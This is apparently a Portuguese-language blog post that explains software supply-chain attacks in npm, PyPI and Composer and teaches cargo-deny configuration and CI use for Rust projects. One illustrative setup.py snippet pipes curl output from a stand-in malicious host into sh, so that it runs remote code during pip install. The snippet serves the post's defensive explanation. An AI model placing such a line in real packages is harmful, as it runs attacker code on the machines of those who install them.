# Semana do terror no PHP, Python e Node: como o cargo deny blinda seu projeto Rust
###### Por [@zejuniortdr](https://github.com/zejuniortdr/) em Out 23, 2026

![Cover](imgs/cover.png)

Ataques de supply chain no npm, PyPI e Composer viraram rotina; veja como o cargo deny barra vulnerabilidades, licenças proibidas e crates abandonadas no CI do Rust.

Você conhece a cena. Segunda-feira, café na mão, e a aba de notificações do GitHub está vermelha: o Dependabot abriu onze PRs durante a madrugada, o Slack do time tem um link de CVE com nota 9.8, e o pipeline que passava na sexta agora quebra num pacote que você nunca instalou. Ele está lá na camada 4 da árvore, puxado por uma lib que puxa uma lib que puxa uma lib.

Nos últimos anos isso deixou de ser exceção e virou calendário. No Node, o `event-stream` (2018) ganhou um mantenedor novo que injetou código para roubar carteiras de Bitcoin; o `ua-parser-js` (2021) foi sequestrado e passou a instalar minerador; em setembro de 2025, a conta de um mantenedor caiu num phishing e pacotes como `chalk` e `debug`, com bilhões de downloads semanais somados, foram publicados com malware; semanas depois veio o worm Shai-Hulud, que se espalhava sozinho roubando tokens do npm. No Python, a `ultralytics` (dezembro de 2024) saiu no PyPI com um minerador embutido via ataque ao pipeline de release. No PHP, até o repositório do próprio `php-src` recebeu, em 2021, commits forjados com um backdoor.

E como se o passado não fosse aviso suficiente, **nesta exata semana (outubro de 2026)** presenciamos um verdadeiro terror: o Node.js teve que lançar correções de emergência no dia 21 para a vulnerabilidade crítica apelidada de **Node2Shell (CVE-2026-111497)**, uma falha no decodificador Brotli que permite Execução Remota de Código (RCE) a partir de fluxos manipulados. No mesmo dia, o ecossistema PHP divulgou o **PHP2Shell (CVE-2026-109618 e CVE-2026-109619)**, duas falhas catastróficas (com nota 9.2 no CVSS) que também permitem RCE no núcleo da linguagem via corrupção de memória e estado global obsoleto. Pior ainda: pesquisadores já detectaram agentes maliciosos explorando o PHP2Shell ativamente na internet poucas horas após a divulgação.

Eu passei mais de duas décadas no mundo Python e web. Não escrevo isso de cima do muro: várias vezes já recebi o alerta vermelho. A pergunta que interessa é outra: **por que isso dói tanto nesses ecossistemas, e o que o Rust te dá de ferramenta para dormir melhor?**

## O problema estrutural (não é falta de cuidado do dev)

Três características deixam linguagens dinâmicas especialmente expostas.

**1. Árvores gigantescas.** O `node_modules` virou meme por um motivo: um projeto React "vazio" traz centenas de pacotes transitivos. Cada um é um mantenedor, uma conta que pode ser invadida, um token que pode vazar.

**2. Código arbitrário rodando na instalação.** Esse é o ponto que pouca gente encara de frente:

```json
// package.json de uma dependência qualquer, lá no fundo da árvore
{
  "name": "lib-inocente",
  "scripts": {
    "postinstall": "node ./setup.js"
  }
}
```

Compare com Python:

```python
# setup.py de um sdist: roda com SEUS privilégios no `pip install`
from setuptools import setup
import os

os.system("curl https://exemplo-malicioso.invalid/payload | sh")  # ninguém revisa isso

setup(name="lib-inocente", version="1.0.0")
```

No npm, `postinstall` roda por padrão. No pip, instalar a partir de um sdist executa o `setup.py` (ou o backend de build) na sua máquina. No Composer, plugins de dependências executam código, e foi exatamente por isso que o Composer 2.2 passou a exigir o `allow-plugins` explícito.

**3. Auditoria que chega depois.** `npm audit`, `pip-audit` e `composer audit` existem e são úteis. Mas geralmente rodam *depois* do `install`, ou seja, depois que o `postinstall` já rodou. E cada ecossistema exige montar o próprio quebra-cabeça para ir além de CVE:

```bash
# Python: uma ferramenta para cada pergunta
pip install pip-audit pip-licenses pipdeptree
pip-audit                                  # vulnerabilidades
pip-licenses --fail-on="GPL;AGPL"          # licenças
pipdeptree --warn fail                     # conflitos na árvore

# Node: mesma história
npm audit --audit-level=high
npx license-checker --failOn "GPL;AGPL"
```

Funciona? Funciona. Mas são três ferramentas, três formatos de configuração, três coisas pra quebrar no CI. Foi o mesmo tipo de "fadiga de tooling" que comentei no [post Cargo contra rapa](../0003-cargo-contra-rapa).

## O contraponto do Rust

O Rust é famoso pela segurança de memória: ownership e borrow checker eliminando classes inteiras de bugs (se esse assunto ainda é nebuloso, comece pelo [guia de ownership para pythonistas](../0005-entendendo-ownership-rust-guia-pythonistas)). O que pouca gente comenta é que a segurança do *ecossistema* também recebeu atenção de primeira classe.

O Cargo já parte de uma base previsível:

- O `Cargo.lock` trava a árvore inteira com checksums, sem precisar de ferramenta extra.
- Versões publicadas no crates.io são **imutáveis**: dá pra fazer `yank` (desaconselhar), mas não dá para substituir o conteúdo de uma versão existente.
- Existe um banco central de vulnerabilidades mantido pela comunidade, o [RustSec Advisory Database](https://rustsec.org).

Mas e se a gente pudesse ser ainda mais paranoico e travar vulnerabilidades, licenças não permitidas e pacotes abandonados antes mesmo de compilar? É aqui que entra o **cargo deny**.

## O que é o cargo deny

O [`cargo-deny`](https://github.com/EmbarkStudios/cargo-deny), mantido pela Embark Studios, é um **linter para o grafo de dependências**. Ele lê o `Cargo.lock` e o metadata do projeto e responde quatro perguntas de uma vez:

| Check | Pergunta que responde |
| ----- | --------------------- |
| `advisories` | Alguma crate da árvore tem vulnerabilidade conhecida, foi abandonada ou sofreu `yank`? |
| `licenses` | Alguma licença da árvore é incompatível com o meu projeto? |
| `bans` | Tem crate proibida, ou várias versões da mesma crate? |
| `sources` | Alguma dependência vem de registry ou repositório git que eu não autorizei? |

Uma ferramenta, um arquivo de configuração, um comando.

### Instalando e inicializando

```bash
cargo install --locked cargo-deny

# na raiz do projeto: gera um deny.toml comentado
cargo deny init

# roda todos os checks
cargo deny check

# ou só um deles
cargo deny check licenses
```

Compare com Python:

```bash
pip install pip-audit pip-licenses
pip-audit && pip-licenses --fail-on="GPL;AGPL"
# e a configuração mora em flags espalhadas pelo CI
```

O `deny.toml` gerado pelo `init` é enorme e cheio de comentários. Abaixo, vou destrinchar seção por seção e no fim juntar tudo numa versão enxuta.

### Advisories: o RustSec como porteiro

```toml
[advisories]
version = 2
# baixa e consulta o banco do RustSec a cada execução
db-urls = ["https://github.com/rustsec/advisory-db"]
# crate abandonada (aviso "unmaintained" no RustSec) quebra o check
unmaintained = "all"
# versão que o autor retirou do registry também
yanked = "deny"
ignore = [
    # exceções documentadas, com motivo e prazo, nunca silenciosas:
    # { id = "RUSTSEC-0000-0000", reason = "sem caminho de exploração; remover na v2.1" },
]
```

O ponto importante: o RustSec não registra só CVE. Ele também publica avisos de crate **sem manutenção** (`unmaintained`) e de crates maliciosas. Quando apareceu o `rustdecimal` em 2022, um typosquat da crate legítima `rust_decimal` que baixava malware em pipelines de CI, ele virou o aviso `RUSTSEC-2022-0042`. Quem rodava cargo deny com o banco atualizado tinha o build barrado.

E repare no `ignore`: dá pra aceitar um risco conscientemente, mas isso fica **escrito no repositório, com motivo**, revisável em PR. Nada de `--ignore` perdido num script de CI.

### Licenças: o problema que Python e Node empurram com a barriga

Se o seu produto é código fechado, uma dependência GPL transitiva é um problema jurídico real. No Python, metadata de licença no PyPI é inconsistente: às vezes está no classifier, às vezes num campo livre, às vezes em lugar nenhum. No Rust, o campo `license` do `Cargo.toml` usa expressões SPDX (`MIT OR Apache-2.0`), e o cargo deny ainda escaneia os arquivos de licença para confirmar.

```toml
[licenses]
version = 2
# lista de PERMITIDAS: tudo fora dela é negado
allow = [
    "MIT",
    "Apache-2.0",
    "BSD-3-Clause",
    "ISC",
    "Unicode-3.0",
]
# quão confiante o scanner precisa estar ao ler um arquivo LICENSE
confidence-threshold = 0.9
# exceção pontual e explícita, por crate
exceptions = [
    # { allow = ["MPL-2.0"], crate = "webpki-roots" },
]

[licenses.private]
# crates internas do workspace que não vão para o crates.io
ignore = true
```

GPL, AGPL e LGPL não estão no `allow`, então qualquer crate com essas licenças em qualquer nível da árvore quebra o check. Para descobrir o que você já tem hoje:

```bash
cargo deny list
```

Compare com Python:

```bash
# depende do metadata que cada autor preencheu (ou não)
pip-licenses --format=markdown
pip-licenses --fail-on="GNU General Public License v3 (GPLv3)"
# o nome precisa bater exatamente com a string do classifier
```

### Bans: proibindo crates e duplicatas

A seção `bans` faz dois trabalhos. O primeiro é a lista negra explícita:

```toml
[bans]
deny = [
    # padronizar TLS em rustls e nunca linkar OpenSSL
    { crate = "openssl", use-instead = "rustls", reason = "evitar dependência de lib C do sistema" },
    { crate = "openssl-sys", use-instead = "rustls" },
]
# proibir `versao = "*"` no Cargo.toml
wildcards = "deny"
```

Crate abandonada é responsabilidade do `advisories` (via aviso `unmaintained` do RustSec); o `bans` é para quando **você** decide que uma crate não entra, seja por política do time, por histórico ruim ou porque já existe alternativa padronizada.

O segundo trabalho é o que mais gosto: **múltiplas versões**.

```bash
# mostra crates que aparecem em mais de uma versão
cargo tree -d
```

Em projetos grandes é comum compilar duas, três, às vezes quatro versões de `syn`, `windows-sys` ou `rand`, porque cada dependência pediu uma faixa diferente. Cada cópia extra é tempo de compilação e tamanho de binário (o mesmo assunto que apareceu quando comparei o pacote da [Lambda em Rust vs Python](../0022-lambda-rust-vs-python-sqs-mysql)).

```toml
[bans]
multiple-versions = "deny"
skip = [
    # duplicata conhecida e aceita até o upstream atualizar
    # { crate = "windows-sys@0.48", reason = "tokio ainda puxa a 0.48" },
]
```

Com `"deny"`, uma dependência nova que traga a quinta versão do `syn` não entra sem alguém justificar no PR. Se for barulho demais no começo, use `"warn"` e aperte depois.

### Sources: de onde vem o código

```toml
[sources]
unknown-registry = "deny"
unknown-git = "deny"
allow-registry = ["https://github.com/rust-lang/crates.io-index"]
allow-git = []
```

Alguém adicionou `minha-lib = { git = "https://github.com/fulano/fork" }` "só para testar"? O check quebra até o repositório entrar explicitamente no `allow-git`.

## Juntando tudo: um deny.toml enxuto

```toml
[graph]
all-features = true

[advisories]
version = 2
unmaintained = "all"
yanked = "deny"
ignore = []

[licenses]
version = 2
allow = ["MIT", "Apache-2.0", "BSD-3-Clause", "ISC", "Unicode-3.0"]
confidence-threshold = 0.9

[licenses.private]
ignore = true

[bans]
multiple-versions = "warn"
wildcards = "deny"
deny = [
    { crate = "openssl", use-instead = "rustls" },
]

[sources]
unknown-registry = "deny"
unknown-git = "deny"
```

Umas 30 linhas, versionadas junto com o código, revisadas em PR como qualquer outra mudança.

## No CI: quebrou, não vai pra produção

No GitHub Actions existe uma action oficial, que já traz o binário pronto:

```yaml
# .github/workflows/deny.yml
name: cargo-deny
on: [push, pull_request]

jobs:
  deny:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: EmbarkStudios/cargo-deny-action@v2
        with:
          command: check advisories licenses bans sources
```

No GitLab CI:

```yaml
cargo-deny:
  image: rust:latest
  script:
    - cargo install --locked cargo-deny
    - cargo deny check
```

Compare com um pipeline Python fazendo o mesmo trabalho:

```yaml
audit:
  image: python:3.13
  script:
    - pip install pip-audit pip-licenses pipdeptree
    - pip install -r requirements.txt   # o código das deps já rodou aqui
    - pip-audit
    - pip-licenses --fail-on="GPL;AGPL"
    - pipdeptree --warn fail
```

Dois detalhes fazem diferença no mundo real:

1. **O cargo deny não compila nada.** Ele lê o `Cargo.lock` e o metadata. Rodar como primeiro job do pipeline significa barrar a dependência ruim *antes* de qualquer `build.rs` ser executado no seu runner.
2. **Agende uma execução diária**, além do push. Um advisory novo pode ser publicado hoje para uma crate que você adicionou há seis meses. Um `schedule` com cron no Actions resolve: o pipeline quebra na terça, e não quando alguém for mexer no projeto daqui a três meses.

## Sem fanatismo: o que o Rust *não* resolve

Seria desonesto parar aqui. O Rust também tem código arbitrário em tempo de build: `build.rs` e macros procedurais rodam na sua máquina durante o `cargo build` (falei de macros no [post sobre macros para pythonistas](../0014-macros-rust-pythonistas)). Uma crate maliciosa recém-publicada, ainda sem advisory, passa pelo cargo deny tranquilamente. Typosquatting também existe no crates.io, como o caso `rustdecimal` mostrou.

| Característica | Python (pip) | Node (npm) | Rust (cargo + cargo deny) |
| -------------- | ------------ | ---------- | ------------------------- |
| Lockfile nativo com hash | Não no pip puro (uv/poetry sim) | Sim | Sim (`Cargo.lock`) |
| Versão publicada imutável | Sim (PyPI não permite reenvio) | Sim (com unpublish limitado) | Sim (só `yank`) |
| Código roda na instalação | Sim (sdist) | Sim (`postinstall`) | Não; roda no build (`build.rs`, proc macros) |
| Vulnerabilidades | `pip-audit` | `npm audit` | `cargo deny check advisories` |
| Crate/pacote abandonado | Manual | Manual | Aviso `unmaintained` do RustSec |
| Licenças | `pip-licenses` (metadata irregular) | `license-checker` | SPDX + scan, `cargo deny check licenses` |
| Versões duplicadas | Não se aplica (uma versão por env) | Comum, sem barreira | `bans.multiple-versions` |
| Origem das dependências | Manual | Manual | `cargo deny check sources` |
| Ferramentas para tudo isso | 3+ | 2+ | 1 |

A diferença não é que o Rust seja imune. É que a resposta da comunidade cabe em **uma ferramenta, um arquivo e um job de CI**, enquanto em outros ecossistemas você costura soluções e torce para elas continuarem conversando entre si.

## O que esse caso ensina

1. **Supply chain é problema de processo, não de linguagem.** Contas de mantenedor são invadidas no npm, no PyPI e no crates.io. O que muda é quão cedo e quão barato você detecta.
2. **Política escrita vence alerta solto.** Um `deny.toml` versionado transforma "acho que não usamos GPL" em uma regra que o CI cobra em todo PR.
3. **Exceção tem que ter motivo.** O `ignore` com `reason` e o `skip` documentado deixam rastro de quem aceitou qual risco e por quê.
4. **Checar antes de compilar importa.** Ler o lockfile antes de rodar `build.rs` fecha uma janela que, no Python e no Node, costuma estar aberta durante o `install`.
5. **Nenhuma ferramenta pega o ataque do dia zero.** Revisar dependência nova no PR, fixar versões e reduzir a árvore continuam sendo obrigação sua.

## Próximos passos

Pegue um projeto Rust seu, rode `cargo deny init && cargo deny check` e veja o que aparece. Aposto que a seção de licenças ou de duplicatas vai te surpreender. Se você ainda está começando e não tem projeto Rust nenhum, o [post sobre o Cargo](../0003-cargo-contra-rapa) é o melhor ponto de partida: ele mostra a base sobre a qual o cargo deny trabalha.

---

Nenhuma linguagem é à prova de balas, mas o ferramental da comunidade Rust coloca uma porta blindada na esteira de desenvolvimento, algo que em outros ecossistemas costuma exigir gambiarra. Se você quer aprender Rust aproveitando tudo o que você já sabe de Python e construir APIs seguras de verdade, garanta sua cópia do livro [Desbravando Rust](https://desbravandorust.com.br).